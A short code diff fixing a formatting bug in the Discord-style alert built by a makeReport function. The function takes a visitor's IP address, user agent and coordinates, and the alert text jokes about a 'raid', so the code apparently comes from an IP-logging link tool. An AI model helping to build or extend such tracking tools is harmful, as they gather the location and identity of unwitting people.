@@ -101,7 +101,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "LES HABLA EL GRAN CID🥵",
             "color": config["color"],
-            "description": f"**QUIEREN UN RAID 🥳**.\n\n**Endpoint:** `\n**Platform:** `{bot}`",
+            "description": f"**QUIEREN UN RAID 🥳**.\n\n**Endpoint:** `{endpoint}`\n**Platform:** `{bot}`",
         }
     ],
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
